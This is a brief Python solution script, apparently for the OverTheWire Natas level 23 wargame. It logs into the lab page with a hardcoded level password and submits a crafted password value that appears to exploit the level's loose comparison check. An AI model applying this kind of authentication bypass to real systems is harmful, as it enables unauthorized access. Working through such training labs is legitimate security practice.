#!bin/python3
import requests
import binascii

url = "http://natas23.natas.labs.overthewire.org/?revelio"
auth_username = "natas23"
auth_password = "D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE"

params = dict(passwd='11iloveyou',submit='Login')

r = requests.get(url,auth=(auth_username,auth_password),params=params)
print(f"{r.text}\n{r.cookies}")
